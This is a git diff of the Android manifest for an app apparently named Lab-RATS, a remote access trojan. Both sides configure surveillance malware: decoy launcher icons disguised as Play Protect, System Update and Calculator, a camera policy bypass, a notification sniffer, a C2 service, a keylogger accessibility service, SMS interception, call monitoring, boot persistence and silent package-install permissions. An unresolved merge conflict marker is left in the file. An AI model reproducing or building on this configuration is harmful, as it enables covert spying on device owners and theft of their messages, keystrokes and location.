@@ -2,350 +2,104 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- Permissions -->
+    <!-- Network -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.ACCESS_LOCAL_NETWORK" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
-    <uses-permission android:name="android.permission.CHANGE_WIFI_MULTICAST_STATE" />
+
+    <!-- Storage: capped so 33+ does not double-prompt -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="29" tools:ignore="ScopedStorage" />
-    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
-    <uses-permission android:name="android.permission.READ_CALL_LOG" />
-    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
-    <uses-permission android:name="android.permission.READ_CONTACTS" />
-    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <!-- Comms -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_MMS" />
-    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+
+    <!-- Location -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <!-- Capture -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
-    <uses-permission android:name="android.permission.CALL_PHONE" />
-    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />
-    <uses-permission android:name="android.permission.READ_CALENDAR" />
-    <uses-permission android:name="android.permission.WRITE_CALENDAR" />
-    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
-    <uses-permission android:name="android.permission.BLUETOOTH" />
-    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
-    <uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
-    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
-    <uses-permission android:name="android.permission.NEARBY_WIFI_DEVICES" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+
+    <!-- System -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
-    <uses-permission android:name="android.permission.WAKE_LOCK" />
-    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-    <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
-    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
-    <uses-permission android:name="android.permission.VIBRATE" />
-    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
-    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
-    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
-    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />
-    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
-    <!-- OEM System / Priv-App Silent Package Manager Permissions -->
-    <uses-permission android:name="android.permission.INSTALL_PACKAGES" tools:ignore="ProtectedPermissions" />
-    <uses-permission android:name="android.permission.DELETE_PACKAGES" tools:ignore="ProtectedPermissions" />
-    <uses-permission android:name="android.permission.INSTALL_GRANT_RUNTIME_PERMISSIONS" tools:ignore="ProtectedPermissions" />
-    <uses-permission android:name="android.permission.MANAGE_USERS" tools:ignore="ProtectedPermissions" />
-    <uses-permission android:name="com.termux.permission.RUN_COMMAND" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CONNECTED_DEVICE" />
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission" />
 
-    <queries>
-        <intent>
-            <action android:name="android.intent.action.TTS_SERVICE" />
-        </intent>
-    </queries>
-
-    <uses-feature android:name="android.hardware.telephony" android:required="false" />
     <uses-feature android:name="android.hardware.camera" android:required="false" />
     <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
+    <uses-feature android:name="android.hardware.location.gps" android:required="false" />
+    <uses-feature android:name="android.hardware.telephony" android:required="false" />
+    <uses-feature android:name="android.hardware.microphone" android:required="false" />
 
     <application
-        android:allowBackup="false"
+        android:name=".LabRatsApp"
+        android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
-        android:theme="@style/Theme.LabRATS"
-        android:requestLegacyExternalStorage="true"
         android:usesCleartextTraffic="true"
-        android:networkSecurityConfig="@xml/network_security_config"
-        android:stopWithTask="false"
-        android:autoRevokePermissions="disallowed"
-        tools:targetApi="34">
-
-        <!-- Android 16 Compatibility: Allow orientation/aspect ratio control on large screens -->
-        <property android:name="android.window.PROPERTY_COMPAT_ALLOW_RESTRICTED_RESIZABILITY" android:value="true" />
+        android:enableOnBackInvokedCallback="true"
+        android:resizeableActivity="true"
+        tools:targetApi="37">
 
         <activity
             android:name=".MainActivity"
             android:exported="true"
-            android:launchMode="singleInstance"
             android:excludeFromRecents="true"
-            android:autoRemoveFromRecents="true"
-            android:taskAffinity=""
-            android:theme="@style/Theme.LabRATS">
+            android:launchMode="singleTask"
+            android:configChanges="orientation|screenSize|keyboardHidden|smallestScreenSize|screenLayout|uiMode"
+            android:windowSoftInputMode="adjustResize">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
         </activity>
 
-        <!-- Camera Policy Bypass Activity -->
         <activity
-            android:name=".CameraHelper$BypassActivity"
-            android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:taskAffinity="com.labs.labrats.bypass_task"
-            android:launchMode="singleInstance"
-            android:excludeFromRecents="true"
-            android:autoRemoveFromRecents="true"
-            android:stateNotNeeded="true"
-            android:exported="false" />
-
-        <!-- Stealth Permission Repair Activity -->
-        <activity
-            android:name=".PermissionActivity"
-            android:theme="@style/Theme.LabRATS.Permissions"
-            android:excludeFromRecents="true"
-<<<<<<< HEAD
-            android:autoRemoveFromRecents="true"
-            android:taskAffinity=""
-=======
->>>>>>> origin/K4N3CO.v1.6
-            android:exported="true" />
-
-        <activity
-            android:name=".DecoyActivity"
+            android:name=".ui.DecoyActivity"
             android:exported="false"
-            android:excludeFromRecents="true"
-            android:autoRemoveFromRecents="true"
-            android:taskAffinity=""
-            android:label="System Update"
-            android:icon="@drawable/ic_analytics_data"
-            android:theme="@style/Theme.LabRATS.Decoy">
-        </activity>
-
-        <activity-alias
-            android:name=".LauncherAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="@string/app_name"
-            android:icon="@mipmap/ic_launcher"
-            android:targetActivity=".MainActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".SystemUpdateAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="System Update"
-            android:icon="@mipmap/ic_system_update_adaptive"
-            android:roundIcon="@mipmap/ic_system_update_round"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".SmartTutorAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="Smart Tutor"
-            android:icon="@drawable/smarttutor_icon"
-            android:roundIcon="@drawable/smarttutor_icon"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".CalculatorAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="Calculator"
-            android:icon="@mipmap/ic_calculator_adaptive"
-            android:roundIcon="@mipmap/ic_calculator_adaptive"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".WeatherAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="Weather"
-            android:icon="@mipmap/ic_weather_adaptive"
-            android:roundIcon="@mipmap/ic_weather_adaptive"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".SettingsAlias"
-            android:enabled="true"
-            android:exported="true"
-            android:label="Play Protect"
-            android:icon="@drawable/playprotect"
-            android:roundIcon="@drawable/playprotect"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".LabRatsLogoAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="Lab-RATS"
-            android:icon="@mipmap/ic_labrats_logo_adaptive"
-            android:roundIcon="@mipmap/ic_labrats_logo_round"
-            android:targetActivity=".MainActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".AndroidSystemAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="Android System"
-            android:icon="@drawable/ic_android_system"
-            android:roundIcon="@drawable/ic_android_system"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
+            android:configChanges="orientation|screenSize|keyboardHidden|smallestScreenSize|screenLayout|uiMode" />
 
         <service
-            android:name="com.labs.labrats.WorkManager_Sync"
-            android:enabled="true"
+            android:name=".core.C2Service"
             android:exported="false"
-            android:stopWithTask="false"
-            android:foregroundServiceType="dataSync|location|specialUse">
-            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="System Stability and Background Data Synchronization" />
-        </service>
+            android:foregroundServiceType="dataSync|camera|microphone|mediaProjection|location|connectedDevice"
+            tools:targetApi="34" />
 
         <service
-            android:name="com.labs.labrats.Analytics_Provider"
-            android:enabled="true"
-            android:exported="false"
-            android:label="Device Bridge"
-            android:stopWithTask="false"
-            android:foregroundServiceType="camera|microphone|dataSync" />
-
-        <!-- Installation Trigger -->
-        <receiver android:name="com.labs.labrats.InstallReferrerReceiver"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="com.android.vending.INSTALL_REFERRER" />
-            </intent-filter>
-        </receiver>
-
-        <receiver
-            android:name="com.labs.labrats.SystemBoot"
-            android:enabled="true"
+            android:name=".services.KeyloggerService"
             android:exported="true"
-            android:label="SysHealthCheck">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
-                <action android:name="android.intent.action.USER_PRESENT" />
-                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
-                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
-                <action android:name="com.labs.pghth.2ZKYUXCYTKZJ" />
-                <action android:name="com.labs.pghth.6U1QVWZ149V3" />
-            </intent-filter>
-        </receiver>
-
-        <!-- Device Admin Receiver -->
-        <receiver
-            android:name="com.labs.labrats.StabilityPolicy"
-            android:description="@string/app_name"
-            android:label="@string/app_name"
-            android:permission="android.permission.BIND_DEVICE_ADMIN"
-            android:exported="true">
-            <meta-data
-                android:name="android.app.device_admin"
-                android:resource="@xml/device_admin" />
-            <intent-filter>
-                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
-            </intent-filter>
-        </receiver>
-
-        <!-- Call Record Service for audio capture -->
-        <service
-            android:name="com.labs.labrats.MediaFrameworkService"
-            android:enabled="true"
-            android:exported="false"
-            android:stopWithTask="false"
-            android:foregroundServiceType="microphone|dataSync" />
-
-        <!-- Call Receiver for detecting incoming/outgoing calls -->
-        <receiver
-            android:name="com.labs.labrats.TelephonyState"
-            android:enabled="true"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.PHONE_STATE" />
-                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
-            </intent-filter>
-        </receiver>
-
-        <!-- Notification Sniffer Service -->
-        <service
-            android:name="com.labs.labrats.StatusNotification"
-            android:enabled="true"
-            android:exported="true"
-            android:stopWithTask="false"
-            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
-            <intent-filter>
-                <action android:name="android.service.notification.NotificationListenerService" />
-            </intent-filter>
-        </service>
-
-
-        <!-- Ghost Controller (Accessibility Service) -->
-        <service
-            android:name="com.labs.labrats.IO_Persistence_Manager"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="true"
-            android:label="System Stability Service"
-            android:stopWithTask="false">
+            tools:targetApi="31">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
@@ -353,6 +107,43 @@
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config" />
         </service>
+
+        <receiver
+            android:name=".receivers.BootReceiver"
+            android:exported="true"
+            android:directBootAware="true"
+            tools:targetApi="24">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".receivers.SmsReceiver"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".receivers.PhoneStateReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".receivers.DialerReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+            </intent-filter>
+        </receiver>
 
         <provider
             android:name="androidx.core.content.FileProvider"
@@ -363,11 +154,5 @@
                 android:name="android.support.FILE_PROVIDER_PATHS"
                 android:resource="@xml/file_paths" />
         </provider>
-        <meta-data
-            android:name="preloaded_fonts"
-            android:resource="@array/preloaded_fonts" />
-
     </application>
-
 </manifest>
-
